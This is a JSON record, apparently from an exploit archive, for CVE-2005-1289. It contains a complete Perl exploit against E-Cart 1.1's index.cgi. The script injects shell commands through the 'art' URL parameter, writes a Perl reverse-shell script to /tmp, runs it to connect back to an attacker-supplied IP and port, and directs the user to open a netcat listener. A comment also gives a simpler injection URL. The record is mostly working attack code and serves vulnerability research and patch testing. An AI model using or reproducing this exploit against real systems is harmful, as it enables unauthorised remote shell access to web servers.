{
  "id": "954",
  "title": "E-Cart 1.1 - &#039;index.cgi&#039; Remote Command Execution",
  "cve": "CVE-2005-1289",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n# Example added if code doesn't work for ya:\r\n# http://SITE/DIRTOECART/index.cgi?action=viewart&cat=reproductores_dvd&art=reproductordvp-ns315.dat|uname%20-a|\r\n# /str0ke\r\n#\r\n#\r\n# info: emanuele@orvietolug.org\r\n#\r\nuse IO::Socket; \r\n\r\nprint \"\\n\\n ~~ www.badroot.org ~~ \\n\\n\";\r\nprint \" E-Cart E-Commerce Software index.cgi\\n\";\r\nprint \" Remote Command Execution Vulnerability\\n\";\r\nprint \" Affected version: <= E-Cart 2004 v1.1\\n\";\r\nprint \" http://www.securityfocus.com/archive/1/396748/2005-04-20/2005-04-26/0  \\n\\n\";\r\nprint \" ~~ code by z\\\\ ~~\\n\\n\\n\";\r\nprint \" 04.23.2005\\n\\n\\n\";\r\n\r\n\r\nprint \"hostname: \\n\"; \r\nchomp($server=<STDIN>);  \r\n\r\nprint \"port: (default: 80)\\n\";\r\nchomp($port=<STDIN>);\r\n$port=80 if ($port =~/\\D/ );\r\n$port=80 if ($port eq \"\" );\r\n\r\nprint \"path: (/cgi-bin/ecart/)\\n\";\r\nchomp($path=<STDIN>);\r\n\r\nprint \"your ip (for reverse connect): \\n\";\r\nchomp($ip=<STDIN>);\r\n\r\nprint \"your port (for reverse connect): \\n\";\r\nchomp($reverse=<STDIN>);\r\n\r\n\r\nprint \" \\n\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~START~~~~~~~~~~~~~~~~~\\r\\n\";\r\n\r\nprint \"[*] try to exploiting...\\n\"; \r\n\r\n$string=\"/$path/index.cgi?action=viewart&cat=reproductores_dvd&art=reproductordvp-ns315.dat|cd /tmp;echo \".q{use Socket;$execute= 'echo \"`uname -a`\";echo \"`id`\";/bin/sh';$target=$ARGV[0];$port=$ARGV[1];$iaddr=inet_aton($target) || die(\"Error: $!\\n\");$paddr=sockaddr_in($port, $iaddr) || die(\"Error: $!\\n\");$proto=getprotobyname('tcp');socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(\"Error: $!\\n\");connect(SOCKET, $paddr) || die(\"Error: $!\\n\");open(STDIN, \">&SOCKET\");open(STDOUT, \">&SOCKET\");open(STDERR, \">&SOCKET\");system($execute);close(STDIN)}.\" >>cbs.pl;perl cbs.pl $ip $reverse|\";\r\n\r\nprint \"[*] OK! \\n\"; \r\nprint \"[*] NOW, run in your box: nc -l -vv -p $reverse\\n\";\r\nprint \"[*] starting connect back on $ip :$reverse\\n\";\r\nprint \"[*] DONE!\\n\";\r\nprint \"[*] Loock netcat windows and funny\\n\\n\";\r\n$socket=IO::Socket::INET->new( PeerAddr => $server, PeerPort => $port, Proto => tcp) \r\nor die; \r\n\r\n\r\nprint $socket \"POST $path HTTP/1.1\\n\"; \r\nprint $socket \"Host: $server\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"User-Agent: 7330ecart\\n\";\r\nprint $socket \"Pragma: no-cache\\n\";\r\nprint $socket \"Cache-Control: no-cache\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\nprint \" WARNING - WARNING - WARNING - WARNING   \\r\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\\n\";\r\nprint \"If connect back shell not found:\\n\";\r\nprint \"- you do not have privileges to write in /tmp\\n\";\r\nprint \"- Shell not vulnerable\\n\\n\\n\";\r\nprint \"Greetz: albythebest - #badroot irc.us.azzurra.org - #hacker.eu us.ircnet.org\\n\\n\\n\";\r\n\r\n\r\n# milw0rm.com [2005-04-25]",
  "url": "https://www.exploit-db.com/exploits/954"
}